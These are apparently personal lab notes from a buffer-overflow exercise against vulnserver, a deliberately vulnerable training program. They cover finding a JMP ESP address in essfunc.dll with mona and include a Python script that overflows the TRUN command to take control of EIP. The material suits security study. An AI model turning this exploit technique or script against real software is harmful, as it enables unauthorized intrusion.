Finding the right module

Thursday, June 22, 2023

10:22 PM

 

Mona module added to vulnserver folder

 

![](006_Finding_the_right_module_000.png){width="13.354166666666666in" height="5.75in"}

 

!mona modules - looking for all false and attached to vulnserver directly. First one is good candidate.

 

Finding jmp code to esp using nasm_shell

![](006_Finding_the_right_module_001.png){width="9.604166666666666in" height="2.9791666666666665in"}

 

 

Finding ff and e4 !mona find -s \"\\xff\\xe4\" -m essfunc.dll

![](006_Finding_the_right_module_002.png){width="11.916666666666666in" height="5.583333333333333in"}

 

Start at top and work down to figure out what works.

 

New python code with return address found from pointers but in reverse order 625011af becomes \"\\xaf\\x11\\x50\\x62\" x86 wants little endian format

 

 

#!/usr/bin/python

 

 

import sys, socket

 

 

shellcode = \"A\" \* 2002 + \"\\xaf\\x11\\x50\\x62\"

 

try:

 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

 

s.connect((\'192.168.1.221\',9999))

 

s.send((\'TRUN /.:/\' + shellcode))

 

s.close()

 

 

except:

 

print (\"Error connecting to the server\")

 

sys.exit()

 

![](006_Finding_the_right_module_003.png){width="4.3125in" height="3.1041666666666665in"}

 

F2 set break point

![](006_Finding_the_right_module_004.png){width="5.739583333333333in" height="3.4479166666666665in"}

 

 

 

 

 

 

 

When you see our value in the eip you know we control it

![](006_Finding_the_right_module_005.png){width="4.958333333333333in" height="2.46875in"}

 
